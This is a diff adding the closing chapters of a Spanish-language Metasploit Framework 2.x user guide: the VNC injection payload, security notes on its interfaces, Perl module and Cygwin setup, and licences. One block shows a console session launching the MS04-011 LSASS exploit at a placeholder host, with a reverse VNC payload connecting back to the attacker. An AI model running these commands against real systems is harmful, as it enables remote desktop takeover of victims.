+Uno de los primeros DLL escritos fue el VNC payload.  Esta aplicación fue escrita por Matt Miller y
+fue basado en el código de la aplicación RealVNC.  El payload nombrado te permite acceso al desktop
+del sistema victima sobre casi todos los Win32 módulos.  El DLL es cargado a la memoria de una
+aplicación, lanzada por un thread nuevo, y espera por conexiones de clientes VNC.  Lo interesante es
+que todo es hecho sobre la misma socket que fue abierta cuando lanzaron el exploit.  El Framework
+simplemente escucha en una socket local por clientes VNC, y guía el trafico sobre la conexión
+inicial así a la VNC server.
+
+\par
+La VNC server hace un atento a obtener acceso optimo.  Si el primer atento falla, calara
+RevertToSelf() y trata otra ves.  Si el segundo atento falla, la server empezara en modo read-only
+resultando en solamente poder leer el desktop del victima.  Al obtener acceso optimo, la VNC server
+lanza un 'command shell' con derechos de la aplicación atacada.  Esto es deseado cuando esta
+utilizando el desktop un usuario con menos derechos que la aplicación atacada.
+
+\par
+En la ocasión que no este utilizando nadie el desktop, el command shell es utilizado para lanzar
+explorer.exe.  Esto puede causarle dolores de cabeza a usuarios que se encuentran con explorer.exe
+corriendo sobre la pantalla login.  Si el desktop corriente es cambiado por alguien (casual o 
+asegurando la sistema), la VNC server desconectara el cliente.
+
+\par
+Para utilizar VNC payloads, ajusta el path del VNC server en la variable \texttt{DLL}.  El VNC server
+es encontrado en el directorio data/ del Framework llamado 'vncdll.dll'.  El código correspondiente se
+encuentra en el directorio src/shellcode/win32/dllinject/vncinject del Framework.
+
+\par
+En versión 2.4 hay varias situaciones en cual el VNC payload simplemente no funciona.  Este problema
+es causado por ambientes raros en ejecutacion y otras problemas menos obvio.  Estas funciones serán
+arreglados en cuanto tiempo permite:
+
+\begin{itemize}
+ \item The cabrightstor\_uniagent exploit will cause the VNC payload to
+ crash, possibly due to a strange heap state.
+ \item The executables generated by \texttt{msfpayload}'s 'X' option are not
+ will cause the VNC payload to crash after spawning the command shell.
+\end{itemize}
+
+\begin{verbatim}
+msf > use lsass_ms04_011
+msf lsass_ms04_011 > set RHOST some.vuln.host
+RHOST -> some.vuln.host
+msf lsass_ms04_011 > set PAYLOAD win32_reverse_vncinject
+PAYLOAD -> win32_reverse_vncinject
+msf lsass_ms04_011(win32_reverse_vncinject) > set LHOST your.own.ip
+LHOST -> your.own.ip
+msf lsass_ms04_011(win32_reverse_vncinject) > set LPORT 4321
+LPORT -> 4321
+msf lsass_ms04_011(win32_reverse_vncinject) > exploit
+\end{verbatim}
+
+Si el "vncviewer" esta en tu path, y el variable AUTOVNC esta ajustado (esta puesto por fabrica), el
+Framework automáticamente lanzara el programa vncviewer.  Ajustando el variable AUTOVNC a 0
+\texttt{set AUTOVNC 0} des hace esta opción; si gustas conectar manualmente a el VNC server ajusta
+vncviewer a 127.0.0.1 al puerto 5900.
+
+\pagebreak
+\chapter{Más Información}
+
+\section{Website}
+\par
+El primer lugar para buscar datos nuevos o versiones nuevos de módulos es en metasploit.com.  Este
+archivo contiene el Opcode Database mantenido por Matt Miller (skape) y una colección de shellcode.
+
+\section{Mailing List}
+\par
+Si gustas entrar a una lista de email para seguir informado sobre datos importantes o discusiones así el
+Framework envíe un email a framework-subscribe[a]metasploit.com.  Esta es la manera preferida para reportar
+bichos, pedir ayuda, o discutir ideas nuevas.  Si gustas leer los archivos de la lista refieran a:
+\url{http://metasploit.com/archive/framework/threads.html}
+
+\section{Development}
+\par
+Si gustan ayudar o tienen preguntas sobre ciertas partes del código, o módulos hagan el favor de mandar
+correo a msfdev[a]metasploit.com.
+
+\pagebreak
+\appendix
+
+\pagebreak
+\chapter{Seguridad}
+
+\par
+Varios 'terminal emulator' terminales de console tienen vulnerabilidades que pueden ser atacadas si usan el
+Framework en maneras inseguras.  Les recomendamos que usen un terminal seguro cuando utilicen los interfazes
+en línea de comando ejemplo: \texttt{konsole}, \texttt{gnome-terminal}, y versiones recientes de
+\texttt{PuTTY}.
+
+\par
+El programa \texttt{msfweb} solamente fue escrito para demostrar las habilidades y flexibilidad del
+Framework, en realidad no les recomendemos que utilicen este programa en redes publicas o que no confíen en.
+
+ \section{Console Interfaces}
+\par
+El console no revisa varias sequencias de escape que pueden resultar en vulnerabilidades si algún
+atacante maldoso enviá caracteres inválidos.  Sugerimos que usted utilice un terminal emulator que limite 
+las sequencias de escape hostiles directas disponibles por la funcionalidad.  Refiera al papel de 
+ediciones de seguridad del 'Terminal Emulators' abajo para más información sobre este asunto:
+
+\url{http://www.digitaldefense.net/labs/papers/Termulation.txt}
+
+ \section{El Interfaz Web}
+\par
+El interfaz \texttt{msfweb} no pruebe acceso para controlar las funciones.  Si el servicio
+es ajustado para recibir clientes universalmente (puesto de fabrica es 127.0.0.1), un atacante
+puede abusar del sistema para esculcar los archivos locales.  La vulnerabilidad esta (de esculcular
+el sistema local) puede ser aprovechada dándoles parámetros peligrosos a un exploit payload que 
+utiliza un archivo local para atacar un servicio de un victimo/servicio falso.  Cuando el atacante 
+recibe el archivo puede hacer lo que quiera con el.
+
+\pagebreak
+\chapter{General Tips}
+
+
+ \section{Tab Completion}
+ \label{REF-TAB}
+\par
+Para permitir el tab-complete en los sistemas estandares de Unix, simplemente
+instale el módulo Term::ReadLine::Gnu.  Este módulo se puede
+encontrar en \url{http://search.cpan.org} así como el directorio de los "suplementos" 
+de este paquete.  Para instalar este módulo:
+
+\begin{verbatim}
+# cd extras
+# tar -zxf Term-ReadLine-Gnu-1.14.tar.gz
+# cd Term-ReadLine-Gnu-1.14
+# perl Makefile.PL && make && make install
+# cd .. && rm -rf Term-ReadLine-Gnu-1.14
+\end{verbatim}
+
+\par
+Si estas usando Mac OS X, necesitaras instalar el paquete GNU readline para permitir
+'tab completion'.
+
+ \section{Secure Socket Layer}
+ \label{REF-SSL}
+\par
+Para permitir SSL, simplemente instale el módulo Net::SSLeay.  Este módulo se puede
+encontrar en \url{http://search.cpan.org} así como el directorio de los "suplementos" 
+de este paquete.  Para instalar este módulo:
+
+\begin{verbatim}
+# cd extras
+# tar -zxf Net_SSLeay.pm-1.23.tar.gz
+# cd Net_SSLeay.pm-1.23
+# perl Makefile.PL && make && make install
+# cd .. && rm -rf Net_SSLeay.pm-1.23
+\end{verbatim}
+
+\par
+Para especificar el modo del SSL para cualquier exploit dado, apenas que ajustes la 
+opción del "SSL" a cualquier valor no-falso (1, True, Yes, etc).
+
+\pagebreak
+\chapter{Cygwin}
+\label{CYGWIN} 
+ 
+\par
+Este capitulo proporciona una breve descripción como instalar el Framework 
+en el ambiente de Cygwin.  Normalmente debes de utilizar el instalador ya configurado
+Win32 del Website.
+
+ \section{Installation}
+\par
+Cygwin es distribuido gratis en \url{http://www.cygwin.com}.  La primer pagina en el Website contiene una contiene un acoplamiento a Setup.exe para la versión más reciente.  
+Simplemente baje este archivo y ejecútelo localmente.  Cuando el instalador comienza, te 
+preguntara si deseas instalar del Internet o utilizar un directorio local.  Seleccione la 
+opción para instalar del Internet y escoge una server para utilizar, el directorio
+para instalarlo debajo, y donde poner los archivos temporales.
+
+\par
+Para soportar 'tab completion' y SSL, asegurate que tengas instalado lo siguiente:
+
+\begin{itemize}
+\item gcc
+\item make
+\item rebase
+\item libreadline
+\item openssl-devel
+\end{itemize}
+
+\par
+Si quieres utilizar el InlineEgg payload[s], te cercioras a instalar una versión reciente de 
+Python también.
+
+ \section{Configuration}
+\par
+Hora que Cygwin esta instalado, debes de instalar los módulos de perl que se encuentran en el
+directorio 'extras' de este paquete.  La mayoría de la ves esto puede ser cumplido con varios
+comandos; abrir el archivo via 'tar -zxf [archivo]', cambiar al directorio, siguiendo con perl
+Makefile.PL, make, y make install para terminar el proceso. 
+
+\par
+Si tienen Visual Studio instalado, pueden evitar problemas si corren el comando "unset LIBS" antes de
+compilar algo, las cotizaciones dobles pueden invalidar varias 'Makefiles'.
+
+ \section{Rebasing}
+\par
+En cuanto es instalado todos los módulos requeridos, debes de correr el programa "rebase" antes de
+utilizar el Framework.  Si obtienes un error parecido a:
+
+\begin{verbatim}
+C:\cygwin\bin\cygperl.exe: *** unable to remap [...]
+\end{verbatim}
+
+Esto significa que requiere no es ejecutado al programa 'rebase.exe'.
+
+\par
+Puedes obtener rebase en:
+\url{http://www.tishler.net/jason/software/rebase/}.
+
+\par
+La aplicación "rebaseall" automáticamente 'rebases' los dll's del sistema, debes de lanzar esta
+aplicación de perdido una vez - en particular cuando utilizan InlineEgg payloads.  Ejemplo de uso:
+
+\begin{verbatim}
+# 1: Localiza el DLL dentro el archivo de perl
+$ find /lib/perl5 -name 'SSLeay.dll'
+
+# 2: Cambia el permiso a 755
+$ chmod 755 /lib/perl5/path/to/SSLeay.dll
+
+# 3: Corre el program a'rebase' en el DLL
+$ rebase -d -b 0x4d455441 /lib/perl5/path/to/SSLeay.dll
+\end{verbatim}
+
+ \section{Tips}
+\par
+Puedes localizar tus discos locales en Windows Cygwin por el directorio /cygdrive/X donde X es 
+la letra del disco local.  si instalas el framework en un directorio cómo C:\verb#\#Framework, 
+puedes mantener un 'symbolic link' usando el comando: 
+
+\begin{verbatim}
+$ ln -sf /cydrive/c/Framework framework
+\end{verbatim}
+
+\pagebreak
+\chapter{Licencias}
+
+\par
+La traducción de la licencia fue omitido para evitar problemas con las limitaciones de la 
+diferencia de los lenguajes.
+
+\par
+The Metasploit Exploit Framework source code is dual-licensed under the GNU
+General Public License v2.0 and the Artistic License. The package is Copyright
+(c) 2003-2005 H D Moore and spoonm, contributions from others and their
+individual copyrights are marked at the top of each file. Copies of the GPL and
+Artistic licenses can be found in the "docs" subdirectory, named "COPYING.GNU"
+and "COPYING.Artistic" respectively.
+
+\par
+The exploit modules included in this package are individually licensed and
+Copyright (c) by their respective authors. Please see the Author field of each
+module to determine what license is specified. If you need a module under a
+different license (GPL module and you want to include it in non-GPL code),
+please contact the author directly.
+
+\par
+The payload modules included in this package are individually licensed and
+Copyright (c) by their respective authors. Please see the Author field of each
+module to determine what license is specified. Some of the assembly payloads
+were obtained from public resources that did not specify the terms of license.
+These payloads are being treated as public domain and will be removed or
+rewritten if a dispute arises.
+
+\par
+The Meterpreter is dual-licensed under the GNU General Public License v2.0 and
+the Artistic License. The Meterpreter component is Copyright (c) 2004-2005 Matt
+Miller. Please contact Matt Miller directly for questions regarding the license
+and licensing of the Meterpreter. 
+
+\par
+The InlineEgg library and some of the examples are Copyright (c) 2002, 2003 Core
+Security Technologies, Core SDI Inc and under a non-commercial license. Please
+see the COPYING.InlineEgg file in the "docs" subdirectory for more information.
+This code may not be included or referenced in any form by a commercial
+derivative of the Metasploit Exploit Framework.
+
+\par
+The Impurity components are licensed under the GNU General Public License v2.0
+and Copyright (c) 2003 Alexander E. Cuttergo. Modifications have been made from
+the original version and the additional components are Copyright (c) 2003 H D
+Moore / METASPLOIT.COM. The assembly payloads and handler routines that are
+incorporated into the Metasploit Exploit Framework are compatible with, but not
+derivative works of, the original Impurity release.
+
+
+\end{document}
+
